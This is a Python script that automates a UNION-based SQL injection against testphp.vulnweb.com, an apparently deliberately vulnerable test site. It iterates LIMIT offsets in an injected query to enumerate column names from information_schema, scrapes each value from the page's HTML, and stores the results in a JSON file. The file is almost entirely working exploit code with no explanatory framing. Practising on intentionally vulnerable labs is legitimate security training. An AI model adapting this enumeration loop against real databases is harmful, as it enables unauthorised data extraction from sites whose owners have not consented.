import requests
from bs4 import BeautifulSoup
import json
import time
import os

# Template URL with the limit parameter
url_template = "http://testphp.vulnweb.com/artists.php?artist=0 union select 1,2,column_name from information_schema.columns limit {},1"
# Total number of IDs to fetch
total_ids = 430
data = []

# Load existing data from JSON file if it exists
if os.path.exists("story_data.json"):
    with open("story_data.json", "r") as file:
        existing_data = json.load(file)
        # Determine the last successful limit
        last_limit = existing_data[-1]['limit'] + 1 if existing_data else 0
else:
    last_limit = 0  # Start from 0 if file doesn't exist

for limit in range(last_limit, total_ids):
    retries = 0
    success = False

    while retries < 3 and not success:
        # Format URL with the current limit value
        url = url_template.format(limit)
        response = requests.get(url)

        # Check if request was successful
        if response.status_code != 200:
            print(f"Request failed with status code: {response.status_code} for limit: {limit}. Retrying...")
            retries += 1
            time.sleep(2)  # Wait before retrying
            continue

        # Check if the response is HTML
        content_type = response.headers.get('Content-Type', '')
        if 'html' not in content_type:
            print(f"Response is not HTML for limit: {limit}. Content-Type: {content_type}. Retrying...")
            retries += 1
            time.sleep(2)  # Wait before retrying
            continue

        # Parse HTML response
        soup = BeautifulSoup(response.content, 'html.parser')

        # Locate the desired data (adjust this based on actual HTML structure)
        table_name_div = soup.find('div', class_='story')  # Update class name as needed
        if table_name_div:
            # Extract and clean up table name content
            table_name_content = table_name_div.get_text(strip=True)
            # Remove unwanted phrases if necessary
            table_name_content = table_name_content.replace("pictures of the artist", "").replace("comment on this artist", "").strip()
            
            print(f"Table Name for limit {limit}: {table_name_content}")
            
            # Append the cleaned data to the list
            data.append({"limit": limit, "table_name": table_name_content})
            success = True  # Mark as successful
        else:
            print(f"Table name content not found for limit: {limit}. Retrying...")
            retries += 1
            time.sleep(2)  # Wait before retrying

    if not success:
        print(f"Failed to fetch data for limit: {limit} after 3 retries.")

# Load existing data if present
if os.path.exists("story_data.json"):
    with open("story_data.json", "r") as file:
        existing_data = json.load(file)
        existing_data.extend(data)  # Append new data to existing data
else:
    existing_data = data  # If no existing data, use the new data

# Save the combined data back to JSON file
with open("story_data.json", "w") as file:
    json.dump(existing_data, file, indent=4)

print(f"Scraping completed. Total items collected: {len(existing_data)}")

